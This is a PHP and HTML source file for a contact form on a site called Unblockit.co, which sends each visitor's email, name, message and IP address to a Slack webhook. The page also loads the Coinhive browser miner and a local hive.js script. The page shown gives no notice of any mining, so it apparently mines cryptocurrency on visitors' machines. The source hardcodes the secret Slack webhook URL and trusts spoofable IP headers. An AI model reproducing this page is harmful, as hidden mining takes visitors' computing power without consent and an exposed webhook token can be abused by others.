<?php 
	function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
?>
<html>
	<head>
		<title>Unblockit.co Contact</title>
		<link rel="stylesheet" href="assets/css/contact.css" type="text/css">
		<link rel="stylesheet" href="assets/css/master.css" type="text/css">
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	</head>
	<body>
	<div id="wrap" align="center">
		<div id="container">
			<div class="header">
				<h1 class="logo">UnBlock It<span>v0.9</span></h1>
			</div>
			<div class="main">
				<?php 
 $webhookurl = "https://hooks.slack.com/services/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";
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 	$email = $_POST['email'];
 	$name = $_POST['name'];
 	$msg = $_POST['msg'];
 	$ip = getRealIpAddr();

 	$snd->text = "Unblockit.co Support: \n ". $ip ." \n ". $email ." \n ". $name ." \n ". $msg ." \n ";

 	$myJSON = json_encode($snd);
 
 	$ch = curl_init($webhookurl); 
 	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
	curl_setopt($ch, CURLOPT_POSTFIELDS, $myJSON);                                                                  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(                                                                          
    'Content-Type: application/json',                                                                                
    'Content-Length: ' . strlen($myJSON))                                                                       
	);          
	$result = curl_exec($ch);
	echo 'Message Sent';
 }
?>
				<form method="POST">
					<input type="email" name="email" class="email" placeholder="Email" required/>
					<br/>
					<input type="text" name="name" class="name" placeholder="Full Name" required/>
					<br/>
					<textarea name="msg" class="msg" placeholder="Message..." required></textarea>
					<br/>
					<input type="submit" class="sub" name="sub" value="Send"/>
				</form>
			</div>
		</div>
	</div>
	<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-105313334-1', 'auto');
  ga('send', 'pageview');

</script>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script src="assets/js/hive.js"></script>
	</body>
</html>